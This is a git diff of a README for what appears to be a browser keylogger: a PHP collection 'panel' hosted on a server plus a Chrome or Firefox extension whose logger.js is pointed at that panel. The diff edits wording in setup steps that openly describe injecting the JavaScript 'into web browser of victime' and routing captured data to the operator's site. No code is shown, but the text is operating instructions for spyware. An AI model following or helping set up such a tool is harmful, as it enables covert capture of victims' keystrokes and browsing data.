@@ -19,7 +19,7 @@ open log without redirect , remove log very simple (new panel )
 
 # Installation Server
 
-Start your wampserver,xamp ....etc and send the "panel" file to your server
+Start your wampserver,xamp ....etc and send the "panel" folder to your server
 + panel
 1. `config.php`
 
@@ -42,9 +42,9 @@ if you want to change DATETIMEZONE clique here https://www.php.net/manual/en/tim
 
 inject javascript code into web browser of victime or use extension chrome or mozilla firefox
 
-Open the extension folder ,js/
+Open the extension folder js/
 + logger.js
-put the name of your website for exemple `http://127.0.0.1/panel/ 
+put the name of your website for exemple `http://127.0.0.1 
 and save changes
 
 + `background.js`
